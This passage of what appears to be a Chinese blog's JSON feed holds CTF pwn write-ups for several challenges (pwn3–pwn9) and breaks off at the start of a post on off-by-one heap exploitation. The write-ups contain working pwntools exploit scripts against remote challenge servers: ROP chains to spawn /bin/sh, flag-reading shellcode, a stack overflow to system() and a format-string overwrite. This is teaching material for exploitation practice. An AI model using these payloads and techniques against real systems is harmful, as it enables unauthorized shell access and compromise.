class=\"number\">0xb</span>)+p32(pop_ebx)+p32(binsh)+p32(pop_ecx)+p32(<span class=\"number\">0</span>)+p32(pop_edx)+p32(<span class=\"number\">0</span>) + p32(int80) + <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#payload= b&quot;/bin/sh\\x00&quot;*0x8</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x68</span>,<span class=\"string\">b&quot;a&quot;</span>)+p32(addr+<span class=\"number\">0xae</span>-<span class=\"number\">0x78</span>+<span class=\"number\">0x10</span>-<span class=\"number\">4</span>)+p32(leaveret)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#payload = payload.ljust(0x68,b&quot;a&quot;) +p32(0)+p32(addr+0xbe-0x78+0x10-4)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr+<span class=\"number\">0xae</span>-<span class=\"number\">0x78</span>+<span class=\"number\">0x10</span>-<span class=\"number\">4</span>))</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t查看符号 readelf objdump?</p>\n<h2 id=\"pwn3\"><a href=\"#pwn3\" class=\"headerlink\" title=\"pwn3\"></a><strong>pwn3</strong></h2><p>恶心的过滤…怎么把过滤应用到这了,</p>\n<p>主要是 一个常用的指令, push xxx, 转成字节码会有\\x68,正好命中了规则,草!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">##!/usr/bin/env python</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">#context(os=&#x27;linux&#x27;,arch=&quot;i386&quot;)</span><br><span class=\"line\">#sh = process(&#x27;./pwn3&#x27;)</span><br><span class=\"line\">sh = remote(&quot;101.43.247.245&quot;,9202)</span><br><span class=\"line\">#systemaddr = 0x8048440</span><br><span class=\"line\">#binsh = 0x80486C0</span><br><span class=\"line\">#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))</span><br><span class=\"line\">context.arch= &#x27;x86&#x27;</span><br><span class=\"line\">context.log_level= &quot;debug&quot;</span><br><span class=\"line\">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class=\"line\">#gdb.attach(sh,&quot;b *0x8048967&quot;)</span><br><span class=\"line\">#gdb.attach(sh)</span><br><span class=\"line\">sh.recvuntil(b&quot;say&quot;)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">sh.sendline(b&quot;a&quot;*0x60+p32(0)+p32(0x99999)+b&quot;d&quot;*8)</span><br><span class=\"line\">#sh.sendline(b&quot;a&quot;*0x70)</span><br><span class=\"line\">#addr = u32(sh.recv(8)[4:8])</span><br><span class=\"line\">sh.recv(0x70)</span><br><span class=\"line\">addr = u32(sh.recv(4))</span><br><span class=\"line\">print(hex(addr))</span><br><span class=\"line\">print(hex(addr+0xbe-0x90+0x28+4))</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax = 0x080b8f16</span><br><span class=\"line\">pop_ebx = 0x080481c9</span><br><span class=\"line\">pop_ecx = 0x080df91d</span><br><span class=\"line\">pop_edx = 0x0806f89b</span><br><span class=\"line\">int80 = 0x0806d4a3</span><br><span class=\"line\">leaveret = 0x08048798</span><br><span class=\"line\">bssaddr = 0x080ECDBB</span><br><span class=\"line\">jmpesp = 0x080dea1f</span><br><span class=\"line\">#binsh =  addr + 0xae-0x78+0x10-4 + 11*4-4</span><br><span class=\"line\">str = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#shellcode = asm(&quot;push 0x0;&quot;)</span><br><span class=\"line\">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class=\"line\">        push 0</span><br><span class=\"line\">        mov eax,0x7478742e</span><br><span class=\"line\">        push eax</span><br><span class=\"line\">        mov  eax,0x67616c66</span><br><span class=\"line\">        push eax</span><br><span class=\"line\">        mov ebx,esp</span><br><span class=\"line\">        xor ecx,ecx         #0</span><br><span class=\"line\">        xor edx,edx         #0</span><br><span class=\"line\">        mov eax,0x5         #调用号</span><br><span class=\"line\">        int 0x80</span><br><span class=\"line\">        mov eax,0x3;</span><br><span class=\"line\">        mov ecx,ebx;    # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</span><br><span class=\"line\">        mov ebx,0x3;    # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件</span><br><span class=\"line\">        mov edx,0x120;  #对应字节数</span><br><span class=\"line\">        int 0x80;</span><br><span class=\"line\">        mov eax,0x4;    # eax = sys_write</span><br><span class=\"line\">        mov ebx,0x1;    # ebx = unsigned int fd = 1</span><br><span class=\"line\">        int 0x80;</span><br><span class=\"line\">        &#x27;&#x27;&#x27;)</span><br><span class=\"line\">#shellcode = b&quot;\\x66\\x6c\\x61\\x67&quot; + shellcode</span><br><span class=\"line\">print(shellcode)</span><br><span class=\"line\">#shellcode = asm(&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;)</span><br><span class=\"line\">#shellcode+=asm(&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;)</span><br><span class=\"line\">#shellcode+=asm(&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = p32(pop_eax)+p32(0xb)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80) + b&quot;cat$flag.txt\\x00&quot;</span><br><span class=\"line\">#payload1 = p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)</span><br><span class=\"line\">#payload2 = p32(pop_eax)+p32(0x5)+p32(pop_ebx)+p32(bssaddr)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80)</span><br><span class=\"line\">#payload2 += p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(3)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)</span><br><span class=\"line\">#payload2 += p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)</span><br><span class=\"line\"></span><br><span class=\"line\">#payload = shellcode</span><br><span class=\"line\">#print(payload)</span><br><span class=\"line\">#print(&quot;length&quot;)</span><br><span class=\"line\">#print(len(payload))</span><br><span class=\"line\">#shellcode = b&quot;&quot;</span><br><span class=\"line\">payload = shellcode.ljust(0x60,b&quot;a&quot;) + p32(0)+p32(0xaaaaa) + p64(0) + p32(0xaaa) + p32(jmpesp) + asm(&quot;sub esp,0x78;jmp esp&quot;)</span><br><span class=\"line\">#payload = b&quot;a&quot;*0x60 + p32(0)+p32(0xaaaaa) + p64(0) + p32(0xaaa) + p32(jmpesp) + asm(&quot;sub esp,0x78;jmp esp&quot;)</span><br><span class=\"line\">#payload = b&quot;a&quot;*0x60 + p32(0)+p32(0x9999)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.recv(0x120)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"pwn4\"><a href=\"#pwn4\" class=\"headerlink\" title=\"pwn4\"></a><strong>pwn4</strong></h2><p>​\t\t0x68 ebp ret 的栈空间      输入0x80 24字节溢出, 减去4字节ebp的话,还有20字节</p>\n<p>​\t\t只开了NX,那就还是rop吧,这个有system和&#x2F;bin&#x2F;sh、或者直接后门函数..</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plt 0x8048440 system</span><br><span class=\"line\">  </span><br><span class=\"line\">0x80486C0 binsh</span><br><span class=\"line\"></span><br><span class=\"line\">.text:080485BD                 public shell</span><br><span class=\"line\">.text:080485BD shell           proc near</span><br><span class=\"line\">.text:080485BD ; __unwind &#123;</span><br><span class=\"line\">.text:080485BD                 push    ebp</span><br><span class=\"line\">.text:080485BE                 mov     ebp, esp</span><br><span class=\"line\">.text:080485C0                 sub     esp, 8</span><br><span class=\"line\">.text:080485C3                 sub     esp, 0Ch</span><br><span class=\"line\">.text:080485C6                 push    offset command  ; &quot;/bin/sh&quot;</span><br><span class=\"line\">.text:080485CB                 call    _system</span><br><span class=\"line\">.text:080485D0                 add     esp, 10h</span><br><span class=\"line\">.text:080485D3                 nop</span><br><span class=\"line\">.text:080485D4                 leave</span><br><span class=\"line\">.text:080485D5                 retn</span><br><span class=\"line\">.text:080485D5 ; &#125; // starts at 80485BD</span><br><span class=\"line\">.text:080485D5 shell           endp</span><br><span class=\"line\">.text:080485D5</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t怎么看system的地址呢?,就是push的值不一样,但怎么确定哪个是system呢? (这个是动态链接了!)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230605221857581.png\" alt=\"image-20230605221857581\"></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = process(&#x27;./pwn04&#x27;)</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;101.43.247.245&quot;</span>,<span class=\"number\">9203</span>)</span><br><span class=\"line\">systemaddr = <span class=\"number\">0x8048440</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x80486C0</span></span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x68</span>+<span class=\"number\">4</span>) + p32(systemaddr)+p32(<span class=\"number\">0</span>)+p32(binsh))</span><br><span class=\"line\"><span class=\"comment\"># sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(0x80485BD))</span></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"pwn5\"><a href=\"#pwn5\" class=\"headerlink\" title=\"pwn5\"></a><strong>pwn5</strong></h2><p>主要是要理解清楚逻辑和内存代码布局就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signed int sub_80488CE()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v0; // eax</span><br><span class=\"line\">  char v2; // [esp-Ch] [ebp-24h]</span><br><span class=\"line\">  int v3; // [esp+Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  sub_804887C();</span><br><span class=\"line\">  v3 = sub_8059F50(48);</span><br><span class=\"line\">  sub_8048987(v3, 48);</span><br><span class=\"line\">  v0 = sub_804DBD0(v3 + 16) + 5;</span><br><span class=\"line\">  if ( v0 == 8 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_8048987(v3, 48);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v0 &gt; 8 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( v0 == 10 )</span><br><span class=\"line\">      return 0;</span><br><span class=\"line\">    if ( v0 == 85145 )</span><br><span class=\"line\">      sub_804F700(&quot;/bin/sh&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v0 == 6 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_804FA00(&quot;where is shell&quot;, v2);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return 1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">#sh = process(&#x27;./pwn5&#x27;)</span><br><span class=\"line\">sh = remote(&quot;101.43.247.245&quot;,9204)</span><br><span class=\"line\">systemaddr = 0x8048440</span><br><span class=\"line\">binsh = 0x80486C0</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= &quot;debug&quot;</span><br><span class=\"line\">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class=\"line\">#gdb.attach(sh,&quot;b *0x008048987&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#payload = p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+p32(0x14c94000)</span><br><span class=\"line\">payload = &quot;1234123412341234&quot; + &quot;85140&quot;</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"pwn6\"><a href=\"#pwn6\" class=\"headerlink\" title=\"pwn6\"></a><strong>pwn6</strong></h2><p>看看又改了啥…</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signed int sub_80488CE()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v0; // eax</span><br><span class=\"line\">  char v2; // [esp-Ch] [ebp-24h]</span><br><span class=\"line\">  char *nptr; // [esp+Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  sub_804887C();</span><br><span class=\"line\">  nptr = (char *)sub_8059F40(48);</span><br><span class=\"line\">  sub_8048980(nptr, 48);</span><br><span class=\"line\">  v0 = atoi_0(nptr);</span><br><span class=\"line\">  if ( v0 == 2 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_8048980(nptr, 48);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v0 &gt; 2 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( v0 == 3 )</span><br><span class=\"line\">      return 0;</span><br><span class=\"line\">    if ( v0 == 12345 )</span><br><span class=\"line\">      sub_804F6F0(&quot;/bin/sh&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v0 == 1 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_804F9F0(&quot;where is shell&quot;, v2);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return 1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>输入12345即可</p>\n<p>root@hecs-149507:~&#x2F;haida# nc 101.43.247.245 9205</p>\n<p>12345</p>\n<h2 id=\"pwn7\"><a href=\"#pwn7\" class=\"headerlink\" title=\"pwn7\"></a><strong>pwn7</strong></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_89588B7()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char s; // [esp+0h] [ebp-68h]</span><br><span class=\"line\"></span><br><span class=\"line\">  sub_895F980(&quot;please input the way you want go&quot;);</span><br><span class=\"line\">  __libc_read(0, &amp;s, 96);</span><br><span class=\"line\">  _IO_puts(&amp;s);</span><br><span class=\"line\">  return sub_80488E7(&amp;s, 0);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>一个char为什么能占据那么多栈空间???</p>\n<p>应该是有很多路径,可以根据&#x2F;bin&#x2F;sh回溯吧?</p>\n<p>是的…一点点回溯就可以找到</p>\n<p>845542A -&gt; 816c3f7-&gt;8091787-&gt;805ac47 -&gt;804d177-&gt;8049ae7-&gt;8048cd7-&gt;8048977-&gt;80488e7-&gt;main</p>\n<p>p32(87)+p32(83)+p32(68)+p32(87)+p32(65)+p32(65)+p32(87)+p32(68)+p32(87)</p>\n<p>878368876565876887</p>\n<p>WSDWAAWDW(这个就是答案)</p>\n<p>为什么87变成0x38了 56了</p>\n<p>0x80488fd  movzx eax, byte ptr [eax]</p>\n<h2 id=\"pwn8\"><a href=\"#pwn8\" class=\"headerlink\" title=\"pwn8\"></a><strong>pwn8</strong></h2><p>格式化字符串,修改内存值即可</p>\n<p>修改0x80EBF9C处的值为28</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_80488CE()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int result; // eax</span><br><span class=\"line\">  char v1; // [esp+0h] [ebp-68h]</span><br><span class=\"line\"></span><br><span class=\"line\">  sub_804F9B0(&quot;please input what you want say&quot;);</span><br><span class=\"line\">  __libc_read(0, &amp;v1, 96);</span><br><span class=\"line\">  sub_804F9B0(&amp;v1);</span><br><span class=\"line\">  if ( dword_80EBF9C == 28 )</span><br><span class=\"line\">    result = sub_804F6B0(&quot;/bin/sh&quot;);</span><br><span class=\"line\">  else</span><br><span class=\"line\">    result = sub_804F9B0(&quot;the key is %d %d&quot;);</span><br><span class=\"line\">  return result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = b&quot;%28d&quot; + b&quot;A&quot; * (0x90 - len(b&quot;%28d&quot;)) + p32(0x80EBF9C)</span><br><span class=\"line\"></span><br><span class=\"line\">sh = remote(&quot;101.43.247.245&quot;,9207)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= &quot;debug&quot;</span><br><span class=\"line\">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class=\"line\">#gdb.attach(sh,&quot;b *0x008048987&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">#payload = b&quot;%28d&quot; + b&quot;A&quot; * (0x90 - len(b&quot;%28d&quot;)) + p32(0x80EBF9C)</span><br><span class=\"line\">payload = fmtstr_payload(4,&#123;0x80EBF9C:28&#125;)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n<h2 id=\"pwn9\"><a href=\"#pwn9\" class=\"headerlink\" title=\"pwn9\"></a><strong>pwn9</strong></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_8048945()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char v1; // [esp+0h] [ebp-1B8h]</span><br><span class=\"line\">  char v2; // [esp+150h] [ebp-68h]</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_puts(&quot;please input your username&quot;);</span><br><span class=\"line\">  __libc_read(0, &amp;v2, 32);</span><br><span class=\"line\">  _IO_puts(&quot;please input your passwd&quot;);</span><br><span class=\"line\">  __libc_read(0, &amp;v1, 335);</span><br><span class=\"line\">  return sub_80488E7(&amp;v1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>不存在溢出</p>\n<p>后面函数是往一个地址写数据..有什么用呢?</p>\n<p>有后们函数,所以应该是要覆盖字符串,或者说字符串复制</p>\n<p>0x08048948 覆盖为 0x80488CE(system)</p>\n<p>第一次写入要覆盖的地址,第二次覆盖</p>\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>回头有时间可以自己编译一下符号</p>\n<p>​\t这样其实有问题,不太对,因为ebp那里的值其实是不确定的,但总是会往前指,或多或少,有时候正好指到shellcode开头或者偏移一点点,至于为什么呢…可以后面在研究</p>\n<p>哪个都行, 不过有一个问题就是,这个值会是固定的嘛…</p>\n<p>plt的过程再熟悉下</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/",
            "title": "pwn入门-29-off—by-one",
            "date_published": "2023-06-03T08:04:02.000Z",
            "content_html": "<p>总的感觉就是通过off by null来修改size区域,然后造成堆块合并,使得堆块重叠,可以修改可控堆块,</p>\n<p>主要看了一个这里面的例子:<a href=\"https://www.jianshu.com/p/8eb55c40ec4a\">https://www.jianshu.com/p/8eb55c40ec4a</a> 还有权威指南的pwn书</p>\n<p><a href=\"https://github.com/shellphish/how2heap/blob/master/glibc_2.23/poison_null_byte.c\">https://github.com/shellphish/how2heap/blob/master/glibc_2.23/poison_null_byte.c</a> how2heap的例子也不错</p>\n<p>demo</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span 